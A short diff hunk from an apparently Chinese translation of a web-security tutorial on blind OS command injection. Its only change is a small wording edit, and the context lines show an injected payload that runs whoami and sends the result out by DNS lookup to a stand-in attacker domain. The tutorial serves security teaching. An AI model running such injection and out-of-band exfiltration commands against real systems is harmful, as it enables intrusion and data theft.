@@ -120,7 +120,7 @@ mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-we
 
 > 实验：[带外交互的 OS 命令盲注](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
 
-带外通道还提供了一种简单的方法来从注入的命令中提取输出：
+带外还提供了一种简单的方法来从注入的命令中提取输出：
 
 ```
 & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
